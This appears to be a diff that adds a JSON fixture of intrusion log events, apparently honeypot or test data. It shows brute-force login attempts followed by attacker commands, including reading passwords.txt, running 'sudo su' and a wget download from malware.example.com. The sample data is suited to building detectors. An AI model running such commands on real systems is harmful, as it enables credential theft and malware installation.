@@ -1,0 +1,92 @@
+[
+  {
+    "type": "login_attempt",
+    "ip": "192.168.1.45",
+    "user": "admin",
+    "status": "failed",
+    "timestamp": "2026-03-15T08:00:51.441961+00:00"
+  },
+  {
+    "type": "login_attempt",
+    "ip": "192.168.1.45",
+    "user": "root",
+    "status": "failed",
+    "timestamp": "2026-03-15T08:00:54.744958+00:00"
+  },
+  {
+    "type": "login_attempt",
+    "ip": "192.168.1.45",
+    "user": "ubuntu",
+    "status": "failed",
+    "timestamp": "2026-03-15T08:00:58.144976+00:00"
+  },
+  {
+    "type": "login_attempt",
+    "ip": "192.168.1.45",
+    "user": "admin",
+    "status": "failed",
+    "timestamp": "2026-03-15T08:01:04.789652+00:00"
+  },
+  {
+    "type": "login_attempt",
+    "ip": "192.168.1.45",
+    "user": "root",
+    "status": "failed",
+    "timestamp": "2026-03-15T08:01:08.135628+00:00"
+  },
+  {
+    "type": "login_attempt",
+    "ip": "192.168.1.45",
+    "user": "admin",
+    "status": "success",
+    "timestamp": "2026-03-15T08:01:11.596923+00:00"
+  },
+  {
+    "type": "attacker_command",
+    "ip": "192.168.1.45",
+    "command": "whoami",
+    "timestamp": "2026-03-15T08:01:18.928664+00:00"
+  },
+  {
+    "type": "attacker_command",
+    "ip": "192.168.1.45",
+    "command": "id",
+    "timestamp": "2026-03-15T08:01:20.362989+00:00"
+  },
+  {
+    "type": "attacker_command",
+    "ip": "192.168.1.45",
+    "command": "uname -a",
+    "timestamp": "2026-03-15T08:01:22.177876+00:00"
+  },
+  {
+    "type": "attacker_command",
+    "ip": "192.168.1.45",
+    "command": "ls",
+    "timestamp": "2026-03-15T08:01:23.611760+00:00"
+  },
+  {
+    "type": "attacker_command",
+    "ip": "192.168.1.45",
+    "command": "cd /home",
+    "timestamp": "2026-03-15T08:01:25.425454+00:00"
+  },
+  {
+    "type": "attacker_command",
+    "ip": "192.168.1.45",
+    "command": "cat passwords.txt",
+    "timestamp": "2026-03-15T08:01:27.819086+00:00"
+  },
+  {
+    "type": "attacker_command",
+    "ip": "192.168.1.45",
+    "command": "wget http://malware.example.com/malware.sh",
+    "timestamp": "2026-03-15T08:01:31.782777+00:00"
+  },
+  {
+    "type": "attacker_command",
+    "ip": "192.168.1.45",
+    "command": "sudo su",
+    "timestamp": "2026-03-15T08:01:33.537586+00:00"
+  }
+]
